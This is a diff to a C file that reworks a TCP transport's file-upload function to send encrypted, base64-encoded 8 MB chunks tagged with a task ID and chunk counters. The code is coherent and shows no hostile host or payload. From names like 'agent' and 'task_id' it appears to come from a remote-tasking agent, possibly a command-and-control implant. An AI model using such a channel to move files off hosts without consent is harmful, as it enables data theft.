@@ -29,6 +29,7 @@ static SOCKET g_tcp_sock = INVALID_SOCKET;
 static volatile LONG g_wsa_state = 0; /* 0=uninitialised, 1=starting, 2=ready, -1=failed */
 
 #define TCP_MAX_FRAME (32u * 1024u * 1024u)
+#define TCP_UPLOAD_CHUNK_SIZE (8u * 1024u * 1024u)
 
 static char* tcp_json_escape(const char *s);
 
@@ -538,29 +539,50 @@ void transport_tcp_upload_file(long long task_id, const char *filename,
                                const uint8_t *data, size_t data_len) {
     if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;
 
-    char *b64_data = b64_encode(data, data_len);
-    if (!b64_data) return;
-
     char *esc_filename = tcp_json_escape(filename);
-    if (!esc_filename) { free(b64_data); return; }
+    if (!esc_filename) return;
 
-    size_t payload_sz = strlen(esc_filename) + strlen(b64_data) + 64;
-    char *payload = (char*)malloc(payload_sz);
-    if (!payload) { free(b64_data); free(esc_filename); return; }
-    snprintf(payload, payload_sz,
-        "{\"task_id\":%lld,\"filename\":\"%s\",\"data\":\"%s\"}",
-        task_id, esc_filename, b64_data);
-    free(b64_data);
-    free(esc_filename);
+    char file_id[32];
+    snprintf(file_id, sizeof(file_id), "%lld", (long long)task_id);
 
-    if (!tcp_send_enc("upload", payload)) {
+    size_t total_chunks = (data_len + TCP_UPLOAD_CHUNK_SIZE - 1) / TCP_UPLOAD_CHUNK_SIZE;
+    if (total_chunks == 0) total_chunks = 1;
+
+    for (size_t chunk_idx = 0; chunk_idx < total_chunks; chunk_idx++) {
+        size_t offset = chunk_idx * TCP_UPLOAD_CHUNK_SIZE;
+        size_t chunk_len = data_len - offset;
+        if (chunk_len > TCP_UPLOAD_CHUNK_SIZE) chunk_len = TCP_UPLOAD_CHUNK_SIZE;
+
+        char *chunk_b64 = b64_encode(data + offset, chunk_len);
+        if (!chunk_b64) { free(esc_filename); tcp_reset(); return; }
+
+        size_t payload_sz = strlen(esc_filename) + strlen(chunk_b64) + 200;
+        char *payload = (char*)malloc(payload_sz);
+        if (!payload) { free(chunk_b64); free(esc_filename); tcp_reset(); return; }
+
+        snprintf(payload, payload_sz,
+            "{\"task_id\":%lld,\"filename\":\"%s\",\"file_id\":\"%s\","
+            "\"chunk_index\":%zu,\"total_chunks\":%zu,\"data\":\"%s\"}",
+            task_id, esc_filename, file_id,
+            chunk_idx, total_chunks, chunk_b64);
+        free(chunk_b64);
+
+        if (!tcp_send_enc("upload_chunk", payload)) {
+            free(payload);
+            free(esc_filename);
+            tcp_reset();
+            return;
+        }
         free(payload);
-        tcp_reset();
-        return;
-    }
-    free(payload);
 
-    if (!tcp_recv_ack()) tcp_reset();
+        if (!tcp_recv_ack()) {
+            free(esc_filename);
+            tcp_reset();
+            return;
+        }
+    }
+
+    free(esc_filename);
 }
 
 uint8_t* transport_tcp_download_file(const char *filename, size_t *out_len) {
